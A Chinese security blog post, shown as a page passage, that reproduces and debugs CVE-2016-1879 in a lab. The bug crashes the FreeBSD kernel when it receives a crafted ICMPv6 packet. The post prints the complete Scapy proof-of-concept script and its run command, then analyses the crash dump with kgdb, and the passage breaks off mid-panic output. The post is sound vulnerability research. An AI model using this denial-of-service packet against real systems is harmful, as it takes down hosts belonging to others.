<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>CVE-2016-1879 调试&amp;分析 | mrh的学习分享</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="0x00 漏洞介绍​    CVE-2016-1879是一个会导致freebsd内核崩溃的一个漏洞。漏洞的具体细节看这里。">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2016-1879 调试&分析">
<meta property="og:url" content="http://turingh.github.io/2016/02/09/CVE-2016-1879调试&分析/index.html">
<meta property="og:site_name" content="mrh的学习分享">
<meta property="og:description" content="0x00 漏洞介绍​    CVE-2016-1879是一个会导致freebsd内核崩溃的一个漏洞。漏洞的具体细节看这里。">
<meta property="og:image" content="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE_2016_1879_packet.jpeg">
<meta property="og:updated_time" content="2016-03-24T03:35:40.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2016-1879 调试&分析">
<meta name="twitter:description" content="0x00 漏洞介绍​    CVE-2016-1879是一个会导致freebsd内核崩溃的一个漏洞。漏洞的具体细节看这里。">
  
    <link rel="alternative" href="/atom.xml" title="mrh的学习分享" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/touxiang.jpeg">
  
  
  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css" type="text/css">
  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
  <script>
      var yiliaConfig = {
          fancybox: true,
          animate: true,
          isHome: false,
          isPost: true,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            
            <img lazy-src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/touxiang.jpeg" class="js-avatar">
            
        </a>

        <hgroup>
          <h1 class="header-author"><a href="/">mrh</a></h1>
        </hgroup>

        
        <p class="header-subtitle">胸口写一个勇字</p>
        
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">博客首页</a></li>
                        
                            <li><a href="/archives">所有文章</a></li>
                        
                            <li><a href="https://github.com/turingH/OSX_CRACKME">CrackMe</a></li>
                        
                            <li><a href="https://raw.githubusercontent.com/turingH/ad/master/README.md">安全站点</a></li>
                        
                            <li><a href="https://github.com/turingH/MACOSX-SecurityUpdate/blob/master/OSX/10.11.4/10.11.4_03_22_16.csv">10.11.4补丁</a></li>
                        
                            <li><a href="https://github.com/turingH/MACOSX-SecurityUpdate/blob/master/OSX/10.11.5/10.11.5_05_16_16.csv">10.11.5补丁</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl github" target="_blank" href="https://github.com/turingH" title="github">github</a>
                            
                                <a class="fl weibo" target="_blank" href="http://weibo.com/u/2047262653" title="weibo">weibo</a>
                            
                                <a class="fl twitter" target="_blank" href="https://twitter.com/samulehuang" title="twitter">twitter</a>
                            
                                <a class="fl facebook" target="_blank" href="https://www.facebook.com/huang.samuel.94" title="facebook">facebook</a>
                            
                                <a class="fl rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <a href="/tags/CVE/" style="font-size: 20px;">CVE</a> <a href="/tags/DWORDSHOOT/" style="font-size: 10px;">DWORDSHOOT</a> <a href="/tags/IOS/" style="font-size: 10px;">IOS</a> <a href="/tags/OS-X/" style="font-size: 14px;">OS X</a> <a href="/tags/OSX/" style="font-size: 12px;">OSX</a> <a href="/tags/POC/" style="font-size: 14px;">POC</a> <a href="/tags/Pegasus/" style="font-size: 10px;">Pegasus</a> <a href="/tags/XNU/" style="font-size: 16px;">XNU</a> <a href="/tags/bounds-checking/" style="font-size: 10px;">bounds checking</a> <a href="/tags/dlopen/" style="font-size: 10px;">dlopen</a> <a href="/tags/dns/" style="font-size: 12px;">dns</a> <a href="/tags/dos/" style="font-size: 10px;">dos</a> <a href="/tags/dyld/" style="font-size: 18px;">dyld</a> <a href="/tags/dynamic-link/" style="font-size: 10px;">dynamic link</a> <a href="/tags/execv/" style="font-size: 14px;">execv</a> <a href="/tags/execve/" style="font-size: 10px;">execve</a> <a href="/tags/exploit/" style="font-size: 20px;">exploit</a> <a href="/tags/frame-faking/" style="font-size: 10px;">frame-faking</a> <a href="/tags/free/" style="font-size: 10px;">free</a> <a href="/tags/freebsd/" style="font-size: 10px;">freebsd</a> <a href="/tags/gethostbyname/" style="font-size: 12px;">gethostbyname</a> <a href="/tags/glibc/" style="font-size: 12px;">glibc</a> <a href="/tags/heap/" style="font-size: 18px;">heap</a> <a href="/tags/hook/" style="font-size: 10px;">hook</a> <a href="/tags/javascrip/" style="font-size: 12px;">javascrip</a> <a href="/tags/kernel/" style="font-size: 16px;">kernel</a> <a href="/tags/kextload/" style="font-size: 10px;">kextload</a> <a href="/tags/level02/" style="font-size: 10px;">level02</a> <a href="/tags/linux/" style="font-size: 12px;">linux</a> <a href="/tags/mach-o/" style="font-size: 20px;">mach-o</a> <a href="/tags/malloc/" style="font-size: 12px;">malloc</a> <a href="/tags/nano/" style="font-size: 10px;">nano</a> <a href="/tags/openssl/" style="font-size: 10px;">openssl</a> <a href="/tags/osx/" style="font-size: 18px;">osx</a> <a href="/tags/patch/" style="font-size: 10px;">patch</a> <a href="/tags/ports/" style="font-size: 14px;">ports</a> <a href="/tags/race/" style="font-size: 14px;">race</a> <a href="/tags/safari/" style="font-size: 12px;">safari</a> <a href="/tags/sandbox/" style="font-size: 10px;">sandbox</a> <a href="/tags/stack/" style="font-size: 14px;">stack</a> <a href="/tags/stackoverflow/" style="font-size: 12px;">stackoverflow</a> <a href="/tags/unlink/" style="font-size: 10px;">unlink</a> <a href="/tags/wargame/" style="font-size: 12px;">wargame</a> <a href="/tags/webkit/" style="font-size: 12px;">webkit</a> <a href="/tags/基本功要扎实/" style="font-size: 12px;">基本功要扎实</a>
                    </div>
                </section>
                
                
                

                
                
                <section class="switch-part switch-part3">
                
                    <div id="js-aboutme">啥也不说了，先干黄旭东</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">mrh</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/touxiang.jpeg" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">mrh</a></h1>
            </hgroup>
            
            <p class="header-subtitle">胸口写一个勇字</p>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">博客首页</a></li>
                
                    <li><a href="/archives">所有文章</a></li>
                
                    <li><a href="https://github.com/turingH/OSX_CRACKME">CrackMe</a></li>
                
                    <li><a href="https://raw.githubusercontent.com/turingH/ad/master/README.md">安全站点</a></li>
                
                    <li><a href="https://github.com/turingH/MACOSX-SecurityUpdate/blob/master/OSX/10.11.4/10.11.4_03_22_16.csv">10.11.4补丁</a></li>
                
                    <li><a href="https://github.com/turingH/MACOSX-SecurityUpdate/blob/master/OSX/10.11.5/10.11.5_05_16_16.csv">10.11.5补丁</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="github" target="_blank" href="https://github.com/turingH" title="github">github</a>
                    
                        <a class="weibo" target="_blank" href="http://weibo.com/u/2047262653" title="weibo">weibo</a>
                    
                        <a class="twitter" target="_blank" href="https://twitter.com/samulehuang" title="twitter">twitter</a>
                    
                        <a class="facebook" target="_blank" href="https://www.facebook.com/huang.samuel.94" title="facebook">facebook</a>
                    
                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                    
                </div>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap"><article id="post-CVE-2016-1879调试&amp;分析" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/02/09/CVE-2016-1879调试&分析/" class="article-date">
      <time datetime="2016-02-09T22:23:13.000Z" itemprop="datePublished">2016-02-09</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      CVE-2016-1879 调试&amp;分析
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/CVE/">CVE</a>
    </div>


        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/dos/">dos</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/freebsd/">freebsd</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="0x00_漏洞介绍">0x00 漏洞介绍</h1><p>​    <a href="http://blog.ptsecurity.com/2016/01/severe-vulnerabilities-detected-in.html" target="_blank" rel="external">CVE-2016-1879</a>是一个会导致freebsd内核崩溃的一个漏洞。漏洞的具体细节看<a href="http://blog.ptsecurity.com/2016/01/severe-vulnerabilities-detected-in.html" target="_blank" rel="external">这里</a>。</p>
<a id="more"></a>
<h1 id="0x01_准备工作">0x01 准备工作</h1><h2 id="1-1_系统安装">1.1 系统安装</h2><p>​    测试系统为FreeBSD-10.1，镜像下载地址点<a href="http://ftp.freebsd.org/pub/FreeBSD/releases/ISO-IMAGES/10.1/FreeBSD-10.1-RELEASE-amd64-disc1.iso" target="_blank" rel="external">这里</a>，大概600M+。注意安装的时候需要选上拷贝内核源码。</p>
<p>​    我在测试的时候poc使用kali-linux运行的。</p>
<h2 id="1-2_重编内核">1.2 重编内核</h2><p>​    因为需要调试FreeBSD的内核，所以需要一个带有debug符号的内核版本。我安装完虚拟机之后发现没有调试符，所以我重新编译了内核。具体过程就不复述了看<a href="https://www.freebsd.org/doc/zh_CN.UTF-8/books/handbook/kernelconfig-building.html" target="_blank" rel="external">这里</a>,配置文件<strong>默认</strong>是<strong>有调试信息</strong>的，所以不需要修改内核的配置文件直接编译安装即可。</p>
<h2 id="1-3_其他设置">1.3 其他设置</h2><ul>
<li>当freebsd内核崩溃时保存dump文件,应该是默认开着的，检查/etc/rc.conf文件。</li>
<li>允许root账号ssh远程登录，这样比较方便，不用ssh远程登录也是可以的。方法在<a href="http://www.unixmen.com/enable-root-login-ssh-freebsd-10/" target="_blank" rel="external">这里</a>。</li>
<li><a href="http://blog.ptsecurity.com/2016/01/severe-vulnerabilities-detected-in.html" target="_blank" rel="external">poc</a>在kali linux系统中不需要配置直接通过python poc.py即可运行，其他系统可能需要自己安装依赖。</li>
</ul>
<h2 id="1-4_网络环境">1.4 网络环境</h2><p>​    两台虚拟机均选择nat模式接入网络即可。</p>
<h1 id="0x02漏洞重现">0x02漏洞重现</h1><p>​    获取freebsd的mac地址与ipv6地址。</p>
<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@:~ <span class="comment"># ifconfig</span></span><br><span class="line">em0: <span class="keyword">flags</span>=<span class="number">8843</span><span class="variable">&lt;UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST&gt;</span> metric <span class="number">0</span> mtu <span class="number">1500</span></span><br><span class="line">	options=<span class="number">9</span>b<span class="variable">&lt;RXCSUM,TXCSUM,VLAN_MTU,VLAN_HWTAGGING,VLAN_HWCSUM&gt;</span></span><br><span class="line">	ether <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:f8:<span class="number">4</span>d:dd</span><br><span class="line">	<span class="keyword">inet6</span> fe80::<span class="number">20</span>c:<span class="number">29</span>ff:fef8:<span class="number">4</span>ddd%em0 prefixlen <span class="number">64</span> scopeid <span class="number">0</span>x1 </span><br><span class="line">	<span class="keyword">inet</span> <span class="number">172.16</span>.<span class="number">9.186</span> netmask <span class="number">0</span>xffffff00 broadcast <span class="number">172.16</span>.<span class="number">9.255</span> </span><br><span class="line">	nd6 options=<span class="number">23</span><span class="variable">&lt;PERFORMNUD,ACCEPT_RTADV,AUTO_LINKLOCAL&gt;</span></span><br><span class="line">	media: Ethernet autoselect (<span class="number">1000</span>baseT <span class="variable">&lt;full-duplex&gt;</span>)</span><br><span class="line">	status: active</span><br><span class="line">lo0: <span class="keyword">flags</span>=<span class="number">8049</span><span class="variable">&lt;UP,LOOPBACK,RUNNING,MULTICAST&gt;</span> metric <span class="number">0</span> mtu <span class="number">16384</span></span><br><span class="line">	options=<span class="number">600003</span><span class="variable">&lt;RXCSUM,TXCSUM,RXCSUM_IPV6,TXCSUM_IPV6&gt;</span></span><br><span class="line">	<span class="keyword">inet6</span> ::<span class="number">1</span> prefixlen <span class="number">128</span> </span><br><span class="line">	<span class="keyword">inet6</span> fe80::<span class="number">1</span>%lo0 prefixlen <span class="number">64</span> scopeid <span class="number">0</span>x2 </span><br><span class="line">	<span class="keyword">inet</span> <span class="number">127.0</span>.<span class="number">0.1</span> netmask <span class="number">0</span>xff000000 </span><br><span class="line">	nd6 options=<span class="number">21</span><span class="variable">&lt;PERFORMNUD,AUTO_LINKLOCAL&gt;</span></span><br></pre></td></tr></table></figure>
<p>​    在kali中执行poc。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">➜  /tmp  ifconfig</span><br><span class="line">eth0: flags=<span class="number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line">        inet <span class="number">172.16</span><span class="number">.9</span><span class="number">.185</span>  netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>  broadcast <span class="number">172.16</span><span class="number">.9</span><span class="number">.255</span></span><br><span class="line">        inet6 fe80::<span class="number">20</span>c:<span class="number">29f</span>f:fe80:<span class="number">3f</span>b7  prefixlen <span class="number">64</span>  scopeid <span class="number">0x20</span>&lt;link&gt;</span><br><span class="line">        ether <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:<span class="number">80</span>:<span class="number">3f</span>:b7  txqueuelen <span class="number">1000</span>  (Ethernet)</span><br><span class="line">        RX packets <span class="number">1011</span>  bytes <span class="number">169118</span> (<span class="number">165.1</span> KiB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">94</span>  bytes <span class="number">15401</span> (<span class="number">15.0</span> KiB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br><span class="line"></span><br><span class="line">lo: flags=<span class="number">73</span>&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class="number">65536</span></span><br><span class="line">        inet <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  netmask <span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">        inet6 ::<span class="number">1</span>  prefixlen <span class="number">128</span>  scopeid <span class="number">0x10</span>&lt;host&gt;</span><br><span class="line">        loop  txqueuelen <span class="number">0</span>  (Local Loopback)</span><br><span class="line">        RX packets <span class="number">50</span>  bytes <span class="number">2980</span> (<span class="number">2.9</span> KiB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">50</span>  bytes <span class="number">2980</span> (<span class="number">2.9</span> KiB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">➜  /tmp  python poc.py -m <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:f8:<span class="number">4</span>d:dd -i fe80::<span class="number">20</span>c:<span class="number">29f</span>f:fef8:<span class="number">4</span>ddd -I eth0</span><br><span class="line">WARNING: No route found <span class="keyword">for</span> IPv6 destination :: (no <span class="keyword">default</span> route?)</span><br><span class="line">.</span><br><span class="line">Sent <span class="number">1</span> packets.</span><br></pre></td></tr></table></figure>
<p>​    执行完之后就会发现freebsd的虚拟机自动重启了。重启完成之后查看可以看到已经产生了dump。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@:~ <span class="preprocessor"># ll /var/crash/</span></span><br><span class="line">total <span class="number">215408</span></span><br><span class="line">-rw-r--r--  <span class="number">1</span> root  wheel         <span class="number">2</span> Feb  <span class="number">9</span> <span class="number">11</span>:<span class="number">08</span> bounds</span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel     <span class="number">75526</span> Feb  <span class="number">9</span> <span class="number">07</span>:<span class="number">49</span> core.txt<span class="number">.0</span></span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel     <span class="number">75224</span> Feb  <span class="number">9</span> <span class="number">09</span>:<span class="number">44</span> core.txt<span class="number">.1</span></span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel     <span class="number">90281</span> Feb  <span class="number">9</span> <span class="number">11</span>:<span class="number">06</span> core.txt<span class="number">.2</span></span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel    <span class="number">100905</span> Feb  <span class="number">9</span> <span class="number">11</span>:<span class="number">08</span> core.txt<span class="number">.3</span></span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel       <span class="number">439</span> Feb  <span class="number">9</span> <span class="number">07</span>:<span class="number">49</span> info<span class="number">.0</span></span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel       <span class="number">408</span> Feb  <span class="number">9</span> <span class="number">09</span>:<span class="number">44</span> info<span class="number">.1</span></span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel       <span class="number">407</span> Feb  <span class="number">9</span> <span class="number">11</span>:<span class="number">06</span> info<span class="number">.2</span></span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel       <span class="number">408</span> Feb  <span class="number">9</span> <span class="number">11</span>:<span class="number">08</span> info<span class="number">.3</span></span><br><span class="line">lrwxr-xr-x  <span class="number">1</span> root  wheel         <span class="number">6</span> Feb  <span class="number">9</span> <span class="number">11</span>:<span class="number">08</span> info.last@ -&gt; info<span class="number">.3</span></span><br><span class="line">-rw-r--r--  <span class="number">1</span> root  wheel         <span class="number">5</span> Nov <span class="number">11</span>  <span class="number">2014</span> minfree</span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel  <span class="number">64851968</span> Feb  <span class="number">9</span> <span class="number">07</span>:<span class="number">49</span> vmcore<span class="number">.0</span></span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel  <span class="number">66797568</span> Feb  <span class="number">9</span> <span class="number">09</span>:<span class="number">44</span> vmcore<span class="number">.1</span></span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel  <span class="number">78901248</span> Feb  <span class="number">9</span> <span class="number">11</span>:<span class="number">06</span> vmcore<span class="number">.2</span></span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel  <span class="number">65212416</span> Feb  <span class="number">9</span> <span class="number">11</span>:<span class="number">08</span> vmcore<span class="number">.3</span></span><br><span class="line">lrwxr-xr-x  <span class="number">1</span> root  wheel         <span class="number">8</span> Feb  <span class="number">9</span> <span class="number">11</span>:<span class="number">08</span> vmcore.last@ -&gt; vmcore<span class="number">.3</span></span><br></pre></td></tr></table></figure>
<h1 id="0x03_攻击包分析">0x03 攻击包分析</h1><h2 id="3-1_分析poc">3.1 分析poc</h2><p>​    先看poc代码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_args</span><span class="params">()</span>:</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'#'</span> * <span class="number">78</span>, epilog=<span class="string">'#'</span> * <span class="number">78</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-m"</span>, <span class="string">"--dst_mac"</span>, type=str, help=<span class="string">"FreeBSD mac address"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-i"</span>, <span class="string">"--dst_ipv6"</span>, type=str, help=<span class="string">"FreeBSD IPv6 address"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-I"</span>, <span class="string">"--iface"</span>, type=str, help=<span class="string">"Iface"</span>)</span><br><span class="line">    options = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.dst_mac <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> options.dst_ipv6 <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> options</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    options = get_args()</span><br><span class="line"></span><br><span class="line">    sendp(</span><br><span class="line">Ether(dst=options.dst_mac) / </span><br><span class="line">IPv6(dst=options.dst_ipv6) / </span><br><span class="line">ICMPv6DestUnreach() / </span><br><span class="line">IPv6(nh=<span class="number">132</span>,                                                                              src=options.dst_ipv6,                                                                                              dst=<span class="string">'fe80::230:56ff:fea6:648c'</span>),</span><br><span class="line">iface=options.iface</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>​    从poc代码可以看出，我们只向目标机器发送一个网络包。</p>
<ul>
<li>ICMPv6DestUnreach()，所以发送的是一个icmp错误信息包。</li>
<li>IPV6（nh=132，…）,ICMPv6包的内容是一个nexthead为132的ipv6包。就是SCTP包。但是这个把包并没有任何SCTP协议的数据。</li>
</ul>
<h2 id="3-2_抓包分析">3.2 抓包分析</h2><p>​    通过wireshark抓取网络包。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE_2016_1879_packet.jpeg" alt="wireshark抓包"></p>
<p>​    确实和我们分析的一样。可以看到payload的length是0。</p>
<h1 id="0x04_分析VMCORE">0x04 分析VMCORE</h1><p>​    进入存放调试信息的文件夹。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@:~ <span class="preprocessor"># cd /usr/obj/usr/src/sys/GENERIC/</span></span><br><span class="line">root@:/usr/obj/usr/src/sys/GENERIC <span class="preprocessor"># ll | grep kernel</span></span><br><span class="line">-rwxr-xr-x  <span class="number">1</span> root  wheel  <span class="number">21156391</span> Feb  <span class="number">9</span> <span class="number">08</span>:<span class="number">41</span> kernel*</span><br><span class="line">-rwxr-xr-x  <span class="number">1</span> root  wheel  <span class="number">87800381</span> Feb  <span class="number">9</span> <span class="number">08</span>:<span class="number">41</span> kernel.debug*</span><br><span class="line">-rwxr-xr-x  <span class="number">1</span> root  wheel  <span class="number">70283677</span> Feb  <span class="number">9</span> <span class="number">08</span>:<span class="number">41</span> kernel.symbols*</span><br></pre></td></tr></table></figure>
<p>​    启动kgdb调试崩溃的VMCORE。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">root@:/usr/obj/usr/src/sys/GENERIC <span class="preprocessor"># kgdb kernel.debug /var/crash/vmcore<span class="number">.1</span> </span></span><br><span class="line">GNU gdb <span class="number">6.1</span><span class="number">.1</span> [FreeBSD]</span><br><span class="line">Copyright <span class="number">2004</span> Free Software Foundation, Inc.</span><br><span class="line">GDB is <span class="built_in">free</span> software, covered by the GNU General Public License, and you are</span><br><span class="line">welcome to change it and/or distribute copies of it under certain conditions.</span><br><span class="line">Type <span class="string">"show copying"</span> to see the conditions.</span><br><span class="line">There is absolutely no warranty <span class="keyword">for</span> GDB.  Type <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">"amd64-marcel-freebsd"</span>...</span><br><span class="line"></span><br><span class="line">Unread portion of the kernel message buffer:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Fatal trap <span class="number">12</span>: page fault <span class="keyword">while</span> in kernel mode</span><br><span class="line">cpuid = <span class="number">0</span>; apic id = <span class="number">00</span></span><br><span class="line">fault <span class="keyword">virtual</span> address	= <span class="number">0x18</span></span><br><span class="line">fault code		= supervisor read data, page not present</span><br><span class="line">instruction pointer	= <span class="number">0x20</span>:<span class="number">0xffffffff809959f0</span></span><br><span class="line"><span class="built_in">stack</span> pointer	        = <span class="number">0x28</span>:<span class="number">0xfffffe00003fd300</span></span><br><span class="line">frame pointer	        = <span class="number">0x28</span>:<span class="number">0xfffffe00003fd340</span></span><br><span class="line">code segment		= base <span class="number">0x0</span>, limit <span class="number">0xfffff</span>, type <span class="number">0x1b</span></span><br><span class="line">			= DPL <span class="number">0</span>, pres <span class="number">1</span>, <span class="keyword">long</span> <span class="number">1</span>, def32 <span class="number">0</span>, gran <span class="number">1</span></span><br><span class="line">processor eflags	= interrupt enabled, resume, IOPL = <span class="number">0</span></span><br><span class="line">current process		= <span class="number">0</span> (em0 taskq)</span><br><span class="line">trap number		= <span class="number">12</span></span><br><span class="line">panic: page 